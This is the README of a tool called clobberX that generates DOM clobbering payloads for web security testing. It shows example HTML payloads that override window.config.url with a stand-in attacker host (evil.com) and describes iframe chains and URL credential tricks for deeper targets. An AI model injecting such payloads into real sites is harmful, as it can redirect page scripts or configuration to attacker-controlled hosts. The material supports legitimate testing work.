# clobberX — DOM Clobbering Payload Generator

A browser-focused tool for generating **DOM Clobbering payloads** for targets like:

```js
window.x
window.config.url
window.auth.username
document.forms.login
```

🔗 Live Demo: https://clobberx.netlify.app/

---

## Features

- Generates DOM clobbering payloads automatically
- Supports both `window` and `document` chains
- Browser-specific payloads (Chrome / Firefox)
- Recursive iframe chain generation
- Dynamic HTML property discovery
- Copy + URL encode support
- Syntax highlighted output

---

## Example

### Input

```txt
Target: window.config.url
Value: https://evil.com
```

### Generated Payload

```html
<form id="config">
  <input id="url" value="https://evil.com">
</form>
```

```html
<a id="config"></a>
<a id="config" name="url" href="https://evil.com"></a>
```

---

## Supported Targets

```js
window.x
window.x.y
window.x.y.z

document.x
document.x.y
document.x.y.z
```

Also supports:
- `src`
- `value`
- `host`
- `username`
- `password`

---

## Deep Clobbering

For deeply nested targets like:

```js
window.a.b.c.d.e
```

clobberX automatically generates nested `iframe[srcdoc]` payload chains.

---

## Browser Compatibility

| Technique | Chrome | Firefox |
|---|---|---|
| Basic clobbering | ✅ | ✅ |
| iframe chains | ✅ | ⚠️ Partial |
| URL username/password tricks | ✅ | ❌ |

---


---

## Links

- Hosted : https://clobberx.netlify.app/
